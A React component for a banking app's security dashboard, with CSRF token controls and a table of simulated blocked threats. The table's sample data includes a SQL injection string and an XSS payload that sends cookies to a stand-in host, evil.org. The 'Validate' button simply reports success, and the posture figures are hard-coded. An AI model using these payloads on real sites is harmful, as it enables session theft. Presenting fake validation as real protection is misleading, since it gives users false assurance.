import React, { useState } from 'react';
import {
  ShieldAlert,
  ShieldCheck,
  Lock,
  Terminal,
  Activity,
  Cpu,
  RefreshCw,
  KeyRound,
  CheckCircle2,
  AlertTriangle,
  Globe,
  Wifi,
  Radio,
} from 'lucide-react';
import { useBanking } from '../../context/BankingContext';

export const SocDashboard: React.FC = () => {
  const { securityConfig, csrfToken, refreshCsrfToken, addAuditLog, addToast } = useBanking();
  const [tokenSimulatedValid, setTokenSimulatedValid] = useState<boolean | null>(null);
  const [activeTab, setActiveTab] = useState<'waf' | 'crypto' | 'telemetry'>('waf');

  const simulatedThreats = [
    {
      id: 'th-1',
      time: '14:48:12 UTC',
      type: 'SQL Injection (SQLi)',
      payload: "' OR '1'='1' -- SELECT * FROM bank_accounts",
      action: 'BLOCKED & ISOLATED',
      sourceIp: '198.51.100.77',
      severity: 'CRITICAL',
    },
    {
      id: 'th-2',
      time: '14:32:05 UTC',
      type: 'Cross-Site Scripting (XSS)',
      payload: "<script>document.location='http://evil.org/steal?cookie='</script>",
      action: 'SANITIZED & NEUTRALIZED',
      sourceIp: '203.0.113.42',
      severity: 'CRITICAL',
    },
    {
      id: 'th-3',
      time: '14:15:20 UTC',
      type: 'Brute-Force Rate Limiting',
      payload: 'Exceeded 5 failed PIN attempts in 10s interval',
      action: 'IP THROTTLED (15m COOLDOWN)',
      sourceIp: '192.0.2.19',
      severity: 'WARNING',
    },
    {
      id: 'th-4',
      time: '13:58:44 UTC',
      type: 'CSRF Origin Verification',
      payload: 'Missing X-Aegis-CSRF header on unauthenticated POST request',
      action: 'REQUEST TERMINATED',
      sourceIp: '198.51.100.201',
      severity: 'SECURITY',
    },
  ];

  const handleTestCsrf = () => {
    setTokenSimulatedValid(true);
    addAuditLog('CSRF_VALIDATION_TEST', `Client session CSRF token ${csrfToken.slice(0, 10)}... cryptographic handshake verified`, 'INFO');
    addToast('Handshake Verified', 'CSRF and request integrity signatures match cryptographic baseline.', 'success');
    setTimeout(() => setTokenSimulatedValid(null), 3000);
  };

  const handleRotateCsrf = () => {
    const newToken = refreshCsrfToken();
    addAuditLog('CSRF_TOKEN_ROTATED', `Active session CSRF token rotated securely to ${newToken.slice(0, 10)}...`, 'INFO');
    addToast('Token Rotated', 'New CSRF security signature generated and bound to active session.', 'info');
  };

  return (
    <div className="space-y-6">
      {/* Header */}
      <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4 border-b border-slate-200 pb-5">
        <div>
          <div className="flex items-center gap-2">
            <h1 className="text-2xl font-black tracking-tight text-slate-900">
              Security Operations Center (SOC)
            </h1>
            <span className="flex items-center gap-1 rounded-full bg-emerald-50 px-2.5 py-0.5 text-xs font-bold text-emerald-700 border border-emerald-200">
              <span className="h-1.5 w-1.5 rounded-full bg-emerald-500 animate-pulse" />
              Live Telemetry
            </span>
          </div>
          <p className="mt-1 text-xs text-slate-500">
            Real-time defense-in-depth telemetry: Web Application Firewall (WAF) mitigations, cryptographic cipher status, and zero-trust perimeter posture.
          </p>
        </div>

        <div className="flex items-center gap-2">
          <span className="rounded-xl bg-slate-900 text-white px-3 py-1.5 font-mono text-xs font-bold shadow-sm">
            SOC 2 Type II • ISO 27001
          </span>
        </div>
      </div>

      {/* Cyber Defense Posture Scorecards */}
      <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4">
        <div className="rounded-2xl bg-white p-5 border border-slate-200/80 shadow-sm">
          <div className="flex items-center justify-between text-slate-500 mb-2">
            <span className="text-xs font-bold uppercase tracking-wider">Perimeter Defense</span>
            <div className="flex h-8 w-8 items-center justify-center rounded-lg bg-emerald-50 text-emerald-600">
              <ShieldCheck className="h-4 w-4" />
            </div>
          </div>
          <p className="text-2xl font-black text-emerald-600">99.98%</p>
          <p className="mt-1 text-[11px] text-slate-500">Zero active vulnerabilities</p>
        </div>

        <div className="rounded-2xl bg-white p-5 border border-slate-200/80 shadow-sm">
          <div className="flex items-center justify-between text-slate-500 mb-2">
            <span className="text-xs font-bold uppercase tracking-wider">Transport Encryption</span>
            <div className="flex h-8 w-8 items-center justify-center rounded-lg bg-blue-50 text-bank-600">
              <Lock className="h-4 w-4" />
            </div>
          </div>
          <p className="text-2xl font-black text-slate-900">TLS 1.3</p>
          <p className="mt-1 text-[11px] text-emerald-600 font-medium">AES-256-GCM + PFS</p>
        </div>

        <div className="rounded-2xl bg-white p-5 border border-slate-200/80 shadow-sm">
          <div className="flex items-center justify-between text-slate-500 mb-2">
            <span className="text-xs font-bold uppercase tracking-wider">Keylogger Mitigation</span>
            <div className="flex h-8 w-8 items-center justify-center rounded-lg bg-purple-50 text-purple-600">
              <Radio className="h-4 w-4" />
            </div>
          </div>
          <p className="text-2xl font-black text-slate-900">Active</p>
          <p className="mt-1 text-[11px] text-slate-500">Randomized keypad scramble</p>
        </div>

        <div className="rounded-2xl bg-white p-5 border border-slate-200/80 shadow-sm">
          <div className="flex items-center justify-between text-slate-500 mb-2">
            <span className="text-xs font-bold uppercase tracking-wider">Inactivity Lockout</span>
            <div className="flex h-8 w-8 items-center justify-center rounded-lg bg-amber-50 text-amber-600">
              <Activity className="h-4 w-4" />
            </div>
          </div>
          <p className="text-2xl font-black text-slate-900">{securityConfig.sessionTimeoutMinutes}m</p>
          <p className="mt-1 text-[11px] text-slate-500">Automatic idle terminal freeze</p>
        </div>
      </div>

      {/* Interactive Cryptographic Handshake & CSRF Station */}
      <div className="rounded-2xl bg-white border border-slate-200/80 p-6 shadow-sm">
        <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4 mb-4">
          <div>
            <h2 className="text-base font-bold text-slate-900">Session Handshake & CSRF Protection</h2>
            <p className="text-xs text-slate-500">
              Cryptographically generated anti-forgery token preventing cross-origin request replay attacks.
            </p>
          </div>

          <div className="flex items-center gap-2">
            <button
              onClick={handleRotateCsrf}
              className="flex items-center gap-1.5 rounded-xl border border-slate-300 bg-white px-3 py-1.5 text-xs font-bold text-slate-700 hover:bg-slate-50 transition"
            >
              <RefreshCw className="h-3.5 w-3.5 text-slate-500" />
              <span>Rotate Token</span>
            </button>

            <button
              onClick={handleTestCsrf}
              className="flex items-center gap-1.5 rounded-xl bg-bank-600 px-3.5 py-1.5 text-xs font-bold text-white hover:bg-bank-700 transition shadow-sm"
            >
              <CheckCircle2 className="h-3.5 w-3.5" />
              <span>Validate Request Signature</span>
            </button>
          </div>
        </div>

        <div className="rounded-xl bg-slate-900 p-4 font-mono text-xs text-emerald-400 space-y-2">
          <div className="flex justify-between items-center text-slate-400 pb-2 border-b border-slate-800">
            <span>Header Name: <strong className="text-white">X-Aegis-CSRF-Token</strong></span>
            <span>Cipher: <strong className="text-white">HMAC-SHA256</strong></span>
          </div>
          <p className="break-all tracking-wider font-bold text-sm text-emerald-300">
            {csrfToken}
          </p>
          {tokenSimulatedValid && (
            <div className="pt-2 text-xs font-bold text-emerald-400 flex items-center gap-1.5">
              <CheckCircle2 className="h-4 w-4" />
              <span>200 OK — Request signature verified against active browser context.</span>
            </div>
          )}
        </div>
      </div>

      {/* WAF Live Threat Neutralization Stream */}
      <div className="rounded-2xl bg-white border border-slate-200/80 p-6 shadow-sm">
        <div className="flex items-center justify-between mb-4">
          <div>
            <h2 className="text-base font-bold text-slate-900">Web Application Firewall (WAF) Threat Stream</h2>
            <p className="text-xs text-slate-500">
              Live threat mitigation log: Automated detection of SQL injection, cross-site scripting, and anomaly requests.
            </p>
          </div>
          <span className="text-xs font-bold text-slate-400">Rule Engine v4.2</span>
        </div>

        <div className="overflow-x-auto">
          <table className="w-full text-left text-xs text-slate-600">
            <thead className="border-b border-slate-100 bg-slate-50/70 text-[10px] font-bold uppercase tracking-wider text-slate-400 font-sans">
              <tr>
                <th className="px-4 py-3">Timestamp</th>
                <th className="px-4 py-3">Threat Vector</th>
                <th className="px-4 py-3">Payload Sample</th>
                <th className="px-4 py-3">Source IP</th>
                <th className="px-4 py-3">Mitigation Action</th>
              </tr>
            </thead>
            <tbody className="divide-y divide-slate-100 font-mono">
              {simulatedThreats.map((threat) => (
                <tr key={threat.id} className="hover:bg-slate-50/50 transition">
                  <td className="px-4 py-3 text-[11px] text-slate-500 whitespace-nowrap">
                    {threat.time}
                  </td>
                  <td className="px-4 py-3 font-bold text-slate-900 whitespace-nowrap font-sans">
                    {threat.type}
                  </td>
                  <td className="px-4 py-3 text-slate-600 max-w-xs truncate" title={threat.payload}>
                    {threat.payload}
                  </td>
                  <td className="px-4 py-3 text-slate-500 whitespace-nowrap">
                    {threat.sourceIp}
                  </td>
                  <td className="px-4 py-3 whitespace-nowrap">
                    <span className="inline-flex items-center gap-1 rounded bg-emerald-100 px-2 py-0.5 text-[10px] font-bold text-emerald-800">
                      ✓ {threat.action}
                    </span>
                  </td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      </div>
    </div>
  );
};
